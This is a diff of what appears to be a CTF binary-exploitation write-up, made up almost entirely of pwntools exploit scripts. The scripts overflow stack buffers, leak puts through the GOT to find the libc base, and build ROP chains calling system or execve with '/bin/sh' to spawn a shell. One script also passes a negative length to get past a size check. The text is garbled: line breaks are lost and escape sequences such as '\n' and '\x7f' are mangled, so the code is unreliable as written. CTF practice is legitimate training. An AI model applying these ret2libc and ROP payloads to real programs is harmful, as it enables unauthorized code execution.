@@ -84,35 +84,20 @@ sh = gdb.debug("./pwn","b *vulnnc")#sh = process("./pwn")elf = ELF("./pwn")libc 
 vuln = 0x40125D
 payload = "A"*88 + p64(vuln)sh.sendline(payload)
 sh.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'context.arch='amd64'
-#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
+    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
 puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']vuln = 0x40125Dpop_rdi_ret = 0x4013d3
 payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(exit_plt)sh.send(payload)sh.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'context.arch='amd64'
-#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
+    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")
 puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3
 payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
 sh.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'context.arch='amd64'
-#sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")libc_puts = libc.sym['puts']libc_system = libc.sym['execve']libc_binsh = libc.search('/bin/sh').next()
+    #sh = gdb.debug("./pwn","b *vulnnc")sh = process("./pwn")elf = ELF("./pwn")libc = ELF("/home/sonomon/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc-2.31.so")libc_puts = libc.sym['puts']libc_system = libc.sym['execve']libc_binsh = libc.search('/bin/sh').next()
 puts_plt = elf.plt['puts']exit_plt = elf.plt['exit']got_puts = elf.got['puts']extend = 0x401287vuln = 0x40125Dpop_rdi_ret = 0x4013d3pop_rsi_r15_ret = 0x4013d1
 
 payload = "A"*88 + p64(vuln)sh.send(payload)payload = "B"*40 + p64(pop_rdi_ret) + p64(got_puts) + p64(puts_plt) + p64(vuln)sh.send(payload)payload = "B"*40 + p64(extend) + p64(vuln)for i in range(0,21): sh.send(payload)
@@ -120,50 +105,25 @@ puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")print(hex(puts_addr))libc_base
 pop_rdx_r12_ret = 0x11c1e1 + libc_base
 payload = "B"*40 + p64(pop_rdi_ret) + p64(binsh_addr) + p64(pop_rsi_r15_ret) + p64(0)+ p64(0) + p64(pop_rdx_r12_ret) + p64(0) + p64(0) + p64(system_addr)sh.send(payload)
 sh.interactive()
-```
-
-
-
-```
 dGhpcyBpcyBwYXNzd29yZA==[0x0]dGhpcyBpcyBwYXNzd29yZA==[0x1]
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'context.arch='amd64'
 sh = gdb.debug("./main","b *0x5555555554fanc")#sh = process("./main")
 elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")sh.interactive()
-```
-
-
-
-```
 sh.sendline("A"*72)
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'context.arch='amd64'
-#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
+    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
 elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
 sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")sh.sendlineafter("length: ","-1")
 payload = "A"*72sh.sendline(payload)text_1297 = u64(sh.recvuntil("[y")[-9:-3] + "x00x00")text_base = text_1297 - 0x1297#print(hex(text_base))puts_plt = elf.plt['puts'] + text_baseputs_got = elf.got['puts'] + text_basepop_rdi_ret = 0x1751 + text_basebio_fun = 0x146A + text_base
 sh.sendlineafter("n]","n")sh.sendlineafter("length: ","-1")
 payload = "A"*104 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(bio_fun)sh.sendline(payload)sh.sendlineafter("n]","y")
 sh.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'context.arch='amd64'
-#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
+    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
 elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_puts = libc.sym['puts']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()
 
 sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
@@ -172,14 +132,9 @@ sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(pop_rdi_ret) + p64(puts
 puts_addr = u64(sh.recvuntil("x7f")[-6:]+"x00x00")libc_base = puts_addr - libc_putsprint(hex(libc_base))system_addr = libc_system + libc_basebinsh_addr = libc_binsh + libc_base
 sh.sendlineafter("length: ","-1")payload = "A"*104 + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)sh.sendline(payload)sh.sendlineafter("n]","y")
 sh.interactive()
-```
-
-
-
-```
 from pwn import *
 context.log_level = 'debug'context.arch='amd64'
-#sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
+    #sh = gdb.debug("./main","b *0x5555555554fanc")sh = process("./main")
 elf = ELF("./main")libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")libc_atoi = libc.sym['atoi']libc_system = libc.sym['system']libc_binsh = libc.search('/bin/sh').next()
 
 sh.sendlineafter("choice: ","2")sh.sendlineafter("username: ","root")sh.sendlineafter("password: ","A" * 34)sh.sendlineafter("choice: ","3")
